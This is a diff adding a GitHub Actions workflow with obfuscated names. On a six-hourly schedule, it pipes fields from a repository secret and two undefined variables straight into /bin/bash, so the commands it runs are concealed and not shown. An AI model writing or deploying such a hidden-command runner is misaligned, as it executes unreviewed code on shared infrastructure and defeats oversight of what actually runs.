@@ -1,0 +1,19 @@
+name: donglaopo7654
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: donglaopo7654
+        env:
+          zg9076: ${{ secrets.zg9076 }}
+        run: |
+          echo $zg9076 | jq -r .x903 | /bin/bash
+          echo $exhe5049 | jq -r .efm226 | /bin/bash
+          echo $vxc1914 | jq -r .xob1719 | /bin/bash
+
